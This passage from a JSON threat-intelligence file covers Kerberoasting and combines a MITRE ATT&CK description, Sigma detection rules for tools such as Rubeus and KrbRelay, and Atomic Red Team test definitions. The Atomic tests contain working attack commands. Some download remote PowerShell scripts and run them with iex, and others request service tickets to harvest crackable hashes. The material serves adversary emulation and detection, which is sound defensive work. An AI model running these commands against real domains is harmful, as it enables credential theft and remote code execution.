vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)\\n\\nThis same behavior could be executed using service tickets captured from network traffic.(Citation: AdSecurity Cracking Kerberos Dec 2015)\\n\\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}], 'x_mitre_detection': 'Enable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17]).(Citation: Microsoft Detecting Kerberoasting Feb 2018)(Citation: AdSecurity Cracking Kerberos Dec 2015)', 'x_mitre_is_subtechnique': True, 'x_mitre_version': '1.2', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['Active Directory: Active Directory Credential Request'], 'x_mitre_system_requirements': ['Valid domain account or the ability to sniff traffic within a domain']}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "12827a56-61a4-476a-a9cb-f3068f191073",
+                        "lookup_data": {
+                            "description": "Detects KrbRelayUp used to perform a universal no-fix local privilege escalation in windows domain environments where LDAP signing is not enforced",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/04/26\ndescription: Detects KrbRelayUp used to perform a universal no-fix local privilege\n  escalation in windows domain environments where LDAP signing is not enforced\ndetection:\n  condition: 1 of selection*\n  selection_flags1:\n    CommandLine|contains|all:\n    - ' relay '\n    - ' -Domain '\n    - ' -ComputerName '\n  selection_flags2:\n    CommandLine|contains|all:\n    - ' krbscm '\n    - ' -sc '\n  selection_flags3:\n    CommandLine|contains|all:\n    - ' spawn '\n    - ' -d '\n    - ' -cn '\n    - ' -cp '\n  selection_name:\n    Image|endswith: \\KrbRelayUp.exe\n  selection_original_name:\n    OriginalFileName: KrbRelayUp.exe\nfalsepositives:\n- Unlikely\nid: 12827a56-61a4-476a-a9cb-f3068f191073\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/04/27\nreferences:\n- https://github.com/Dec0ne/KrbRelayUp\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1558.003\n- attack.lateral_movement\n- attack.t1550.003\ntitle: KrbRelayUp Hack Tool\n",
+                            "sigma:id": "12827a56-61a4-476a-a9cb-f3068f191073",
+                            "title": "KrbRelayUp Hack Tool",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "6daac7fc-77d1-449a-a71a-e6b4d59a0e54",
+                        "lookup_data": {
+                            "description": "The 'LsaRegisterLogonProcess' function verifies that the application making the function call is a logon process by checking that it has the SeTcbPrivilege privilege set. Possible Rubeus tries to get a handle to LSA.",
+                            "raw": "author: Roberto Rodriguez (source), Ilyas Ochkov (rule), oscd.community\ndate: 2019/10/24\ndescription: The 'LsaRegisterLogonProcess' function verifies that the application\n  making the function call is a logon process by checking that it has the SeTcbPrivilege\n  privilege set. Possible Rubeus tries to get a handle to LSA.\ndetection:\n  condition: selection\n  selection:\n    EventID: 4673\n    Keywords: '0x8010000000000000'\n    Provider_Name: Microsoft-Windows-Security-Auditing\n    Service: LsaRegisterLogonProcess()\nfalsepositives:\n- Unknown\nid: 6daac7fc-77d1-449a-a71a-e6b4d59a0e54\nlevel: high\nlogsource:\n  product: windows\n  service: security\nmodified: 2022/12/25\nreferences:\n- https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1\nstatus: test\ntags:\n- attack.lateral_movement\n- attack.privilege_escalation\n- attack.t1558.003\ntitle: User Couldn't Call a Privileged Service 'LsaRegisterLogonProcess'\n",
+                            "sigma:id": "6daac7fc-77d1-449a-a71a-e6b4d59a0e54",
+                            "title": "User Couldn't Call a Privileged Service 'LsaRegisterLogonProcess'",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "e96253b8-6b3b-4f90-9e59-3b24b99cf9b4",
+                        "lookup_data": {
+                            "description": "Detects the use of KrbRelay, a Kerberos relaying tool",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/04/27\ndescription: Detects the use of KrbRelay, a Kerberos relaying tool\ndetection:\n  condition: 1 of selection*\n  selection_flags1:\n    CommandLine|contains|all:\n    - ' -spn '\n    - ' -clsid '\n    - ' -rbcd '\n  selection_flags2:\n    CommandLine|contains|all:\n    - shadowcred\n    - clsid\n    - spn\n  selection_flags3:\n    CommandLine|contains|all:\n    - 'spn '\n    - 'session '\n    - 'clsid '\n  selection_name:\n    Image|endswith: \\KrbRelay.exe\n  selection_original_name:\n    OriginalFileName: KrbRelay.exe\nfalsepositives:\n- Unlikely\nid: e96253b8-6b3b-4f90-9e59-3b24b99cf9b4\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/cube0x0/KrbRelay\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1558.003\ntitle: KrbRelay Hack Tool\n",
+                            "sigma:id": "e96253b8-6b3b-4f90-9e59-3b24b99cf9b4",
+                            "title": "KrbRelay Hack Tool",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "496a0e47-0a33-4dca-b009-9e6ca3591f39",
+                        "lookup_data": {
+                            "description": "Detects service ticket requests using RC4 encryption type",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2017/02/06\ndescription: Detects service ticket requests using RC4 encryption type\ndetection:\n  condition: selection and not reduction\n  reduction:\n    ServiceName|endswith: $\n  selection:\n    EventID: 4769\n    TicketEncryptionType: '0x17'\n    TicketOptions: '0x40810000'\nfalsepositives:\n- Service accounts used on legacy systems (e.g. NetApp)\n- Windows Domains with DFL 2003 and legacy systems\nid: 496a0e47-0a33-4dca-b009-9e6ca3591f39\nlevel: medium\nlogsource:\n  product: windows\n  service: security\nmodified: 2022/06/19\nreferences:\n- https://adsecurity.org/?p=3458\n- https://www.trimarcsecurity.com/single-post/TrimarcResearch/Detecting-Kerberoasting-Activity\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1558.003\ntitle: Suspicious Kerberos RC4 Ticket Encryption\n",
+                            "sigma:id": "496a0e47-0a33-4dca-b009-9e6ca3591f39",
+                            "title": "Suspicious Kerberos RC4 Ticket Encryption",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "44bbff3e-4ca3-452d-a49a-6efa4cafa06f",
+                        "lookup_data": {
+                            "description": "The attacker creates a computer object using those permissions with a password known to her.\nAfter that she clears the attribute ServicePrincipalName on the computer object.\nBecause she created the object (CREATOR OWNER), she gets granted additional permissions and can do many changes to the object.\n",
+                            "raw": "author: frack113\ndate: 2021/12/15\ndescription: 'The attacker creates a computer object using those permissions with\n  a password known to her.\n\n  After that she clears the attribute ServicePrincipalName on the computer object.\n\n  Because she created the object (CREATOR OWNER), she gets granted additional permissions\n  and can do many changes to the object.\n\n  '\ndetection:\n  condition: 1 of selection_*\n  selection_1:\n    EventID:\n    - 35\n    - 36\n    - 37\n    - 38\n    Provider_Name: Microsoft-Windows-Kerberos-Key-Distribution-Center\n  selection_2:\n    EventID:\n    - 16990\n    - 16991\n    Provider_Name: Microsoft-Windows-Directory-Services-SAM\nfalsepositives:\n- Unknown\nfields:\n- samAccountName\nid: 44bbff3e-4ca3-452d-a49a-6efa4cafa06f\nlevel: medium\nlogsource:\n  product: windows\n  service: system\nmodified: 2022/12/25\nreferences:\n- https://cloudbrothers.info/en/exploit-kerberos-samaccountname-spoofing/\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1558.003\ntitle: Exploit SamAccountName Spoofing with Kerberos\n",
+                            "sigma:id": "44bbff3e-4ca3-452d-a49a-6efa4cafa06f",
+                            "title": "Exploit SamAccountName Spoofing with Kerberos",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "1eeed653-dbc8-4187-ad0c-eeebb20e6599",
+                        "lookup_data": {
+                            "description": "Detects Service Principal Name Enumeration used for Kerberoasting",
+                            "raw": "author: Markus Neis, keepwatch\ndate: 2018/11/14\ndescription: Detects Service Principal Name Enumeration used for Kerberoasting\ndetection:\n  cmd:\n    CommandLine|contains: -q\n  condition: (selection_image or selection_desc) and cmd\n  selection_desc:\n    Description|contains|all:\n    - Query or reset the computer\n    - SPN attribute\n  selection_image:\n    Image|endswith: \\setspn.exe\nfalsepositives:\n- Administrator Activity\nid: 1eeed653-dbc8-4187-ad0c-eeebb20e6599\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://p16.praetorian.com/blog/how-to-use-kerberoasting-t1208-for-privilege-escalation\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1558.003\ntitle: Possible SPN Enumeration\n",
+                            "sigma:id": "1eeed653-dbc8-4187-ad0c-eeebb20e6599",
+                            "title": "Possible SPN Enumeration",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "7ec2c172-dceb-4c10-92c9-87c1881b7e18",
+                        "lookup_data": {
+                            "description": "Detects the execution of the hacktool Rubeus via PE information of command line parameters",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2018/12/19\ndescription: Detects the execution of the hacktool Rubeus via PE information of command\n  line parameters\ndetection:\n  condition: selection\n  selection:\n  - Image|endswith: \\Rubeus.exe\n  - OriginalFileName: Rubeus.exe\n  - Description: Rubeus\n  - CommandLine|contains:\n    - ' asreproast '\n    - ' dump /service:krbtgt '\n    - ' dump /luid:0x'\n    - ' kerberoast '\n    - ' createnetonly /program:'\n    - ' ptt /ticket:'\n    - ' /impersonateuser:'\n    - ' renew /ticket:'\n    - ' asktgt /user:'\n    - ' harvest /interval:'\n    - ' s4u /user:'\n    - ' s4u /ticket:'\n    - ' hash /password:'\n    - ' golden /aes256:'\n    - ' silver /user:'\nfalsepositives:\n- Unlikely\nid: 7ec2c172-dceb-4c10-92c9-87c1881b7e18\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/11\nreferences:\n- https://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/\n- https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html\n- https://github.com/GhostPack/Rubeus\nstatus: stable\ntags:\n- attack.credential_access\n- attack.t1003\n- attack.t1558.003\n- attack.lateral_movement\n- attack.t1550.003\ntitle: Rubeus Hack Tool\n",
+                            "sigma:id": "7ec2c172-dceb-4c10-92c9-87c1881b7e18",
+                            "title": "Rubeus Hack Tool",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "a861d835-af37-4930-bcd6-5b178bfb54df",
+                        "lookup_data": {
+                            "description": "utilize native PowerShell Identity modules to query the domain to extract the Service Principal Names for a single computer.\nThis behavior is typically used during a kerberos or silver ticket attack.\nA successful execution will output the SPNs for the endpoint in question.\n",
+                            "raw": "author: frack113\ndate: 2021/12/28\ndescription: 'utilize native PowerShell Identity modules to query the domain to extract\n  the Service Principal Names for a single computer.\n\n  This behavior is typically used during a kerberos or silver ticket attack.\n\n  A successful execution will output the SPNs for the endpoint in question.\n\n  '\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains: System.IdentityModel.Tokens.KerberosRequestorSecurityToken\nfalsepositives:\n- Unknown\nid: a861d835-af37-4930-bcd6-5b178bfb54df\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1558.003/T1558.003.md#atomic-test-4---request-a-single-ticket-via-powershell\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1558.003\ntitle: Request A Single Ticket via PowerShell\n",
+                            "sigma:id": "a861d835-af37-4930-bcd6-5b178bfb54df",
+                            "title": "Request A Single Ticket via PowerShell",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "503fe26e-b5f2-4944-a126-eab405cc06e5",
+                        "lookup_data": {
+                            "description": "Detects kerberos TGS request using RC4 encryption which may be indicative of kerberoasting",
+                            "raw": "author: sigma\ndate: 2020/02/12\ndescription: Detects kerberos TGS request using RC4 encryption which may be indicative\n  of kerberoasting\ndetection:\n  computer_acct:\n    service|startswith: $\n  condition: selection and not computer_acct\n  selection:\n    cipher: rc4-hmac\n    request_type: TGS\nfalsepositives:\n- Normal enterprise SPN requests activity\nid: 503fe26e-b5f2-4944-a126-eab405cc06e5\nlevel: medium\nlogsource:\n  product: zeek\n  service: kerberos\nmodified: 2021/11/27\nreferences:\n- https://adsecurity.org/?p=3458\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1558.003\ntitle: Kerberos Network Traffic RC4 Ticket Encryption\n",
+                            "sigma:id": "503fe26e-b5f2-4944-a126-eab405cc06e5",
+                            "title": "Kerberos Network Traffic RC4 Ticket Encryption",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "eca91c7c-9214-47b9-b4c5-cb1d7e4f2350",
+                        "lookup_data": {
+                            "description": "Detects suspicious outbound network activity via kerberos default port indicating possible lateral movement or first stage PrivEsc via delegation.",
+                            "raw": "author: Ilyas Ochkov, oscd.community\ndate: 2019/10/24\ndescription: Detects suspicious outbound network activity via kerberos default port\n  indicating possible lateral movement or first stage PrivEsc via delegation.\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_exact:\n    Application:\n    - C:\\Windows\\System32\\lsass.exe\n    - C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\n    - C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\n    - C:\\Program Files\\Mozilla Firefox\\firefox.exe\n    - C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe\n  selection:\n    DestPort: 88\n    EventID: 5156\nfalsepositives:\n- Web Browsers\nid: eca91c7c-9214-47b9-b4c5-cb1d7e4f2350\nlevel: high\nlogsource:\n  product: windows\n  service: security\nmodified: 2023/01/30\nreferences:\n- https://github.com/GhostPack/Rubeus\nrelated:\n- id: e54979bd-c5f9-4d6c-967b-a04b19ac4c74\n  type: similar\nstatus: test\ntags:\n- attack.lateral_movement\n- attack.t1558.003\ntitle: Suspicious Outbound Kerberos Connection - Security\n",
+                            "sigma:id": "eca91c7c-9214-47b9-b4c5-cb1d7e4f2350",
+                            "title": "Suspicious Outbound Kerberos Connection - Security",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1558.003",
+                "display_name": "Steal or Forge Kerberos Tickets: Kerberoasting",
+                "atomic_tests": [
+                    {
+                        "name": "Request for service tickets",
+                        "auto_generated_guid": "3f987809-3681-43c8-bcd8-b3ff3a28533a",
+                        "description": "This test uses the Powershell Empire Module: Invoke-Kerberoast.ps1\nThe following are further sources and credits for this attack:\n[Kerberoasting Without Mimikatz source] (https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)\n[Invoke-Kerberoast source] (https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)\nwhen executed successfully , the test displays available services with their hashes. \nIf the testing domain doesn't have any service principal name configured, there is no output\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "dependencies": [
+                            {
+                                "description": "Computer must be domain joined\n",
+                                "prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\niex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)\nInvoke-Kerberoast | fl\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Rubeus kerberoast",
+                        "auto_generated_guid": "14625569-6def-4497-99ac-8e7817105b55",
+                        "description": "Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast\nThis build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "local_folder": {
+                                "description": "Local path of Rubeus executable",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads"
+                            },
+                            "local_executable": {
+                                "description": "name of the rubeus executable",
+                                "type": "string",
+                                "default": "rubeus.exe"
+                            },
+                            "out_file": {
+                                "description": "file where command results are stored",
+                                "type": "string",
+                                "default": "rubeus_output.txt"
+                            },
+                            "rubeus_url": {
+                                "description": "URL of Rubeus executable",
+                                "type": "url",
+                                "default": "https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe"
+                            },
+                            "flags": {
+                                "description": "command flags you would like to run (optional and blank by default)",
+                                "type": "string",
+                                "default": null
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Computer must be domain joined\n",
+                                "prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"
+                            },
+                            {
+                                "description": "Rubeus must exist\n",
+                                "prereq_command": "if(Test-Path -Path \"#{local_folder}\\#{local_executable}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-Webrequest -Uri #{rubeus_url} -OutFile \"#{local_folder}\\#{local_executable}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "klist purge\ncmd.exe /c \"#{local_folder}\\#{local_executable}\" kerberoast #{flags} /outfile:\"#{local_folder}\\#{out_file}\"\n",
+                            "cleanup_command": "Remove-Item \"#{local_folder}\\#{out_file}\" -ErrorAction Ignore\n",
+                            "name": "powershell",
+                            "elevation_required": false
+                        }
+                    },
+                    {
+                        "name": "Extract all accounts in use as SPN using setspn",
+                        "auto_generated_guid": "e6f4affd-d826-4871-9a62-6c9004b8fe06",
+                        "description": "The following test will utilize setspn to extract the Service Principal Names. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output all the SPNs for the related domain. \n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "domain_name": {
+                                "description": "The Domain Name to lookup against",
+                                "type": "string",
+                                "default": "%USERDNSDOMAIN%"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Computer must be domain joined\n",
+                                "prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "setspn -T #{domain_name} -Q */*\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Request A Single Ticket via PowerShell",
+                        "auto_generated_guid": "988539bc-2ed7-4e62-aec6-7c5cf6680863",
+                        "description": "The following test will utilize native PowerShell Identity modules to query the domain to extract the Service Principal Names for a single computer. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output the SPNs for the endpoint in question.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Computer must be domain joined\n",
+                                "prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "Add-Type -AssemblyName System.IdentityModel\n$ComputerFQDN=$env:LogonServer.trimStart('\\') + \".\" + $env:UserDnsDomain\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"HTTP/$ComputerFQDN\" \n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Request All Tickets via PowerShell",
+                        "auto_generated_guid": "902f4ed2-1aba-4133-90f2-cff6d299d6da",
+                        "description": "The following test will utilize native PowerShell Identity modules to query the domain to extract allthe Service Principal Names. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output the SPNs for the domain in question.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "domain_name": {
+                                "description": "The Domain Name to lookup against",
+                                "type": "string",
+                                "default": "%USERDNSDOMAIN%"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Computer must be domain joined\n",
+                                "prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "Add-Type -AssemblyName System.IdentityModel  \nsetspn.exe -T #{domain_name} -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  \n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "WinPwn - Kerberoasting",
+                        "auto_generated_guid": "78d10e20-c874-45f2-a9df-6fea0120ec27",
+                        "description": "Kerberoasting technique via function of WinPwn",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nKerberoasting -consoleoutput -noninteractive",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "WinPwn - PowerSharpPack - Kerberoasting Using Rubeus",
+                        "auto_generated_guid": "29094950-2c96-4cbd-b5e4-f7c65079678f",
+                        "description": "PowerSharpPack - Kerberoasting Using Rubeus technique via function of WinPwn",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')\nInvoke-Rubeus -Command \"kerberoast /format:hashcat /nowrap\"",
+                            "name": "powershell"
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 16:28:57"
+}
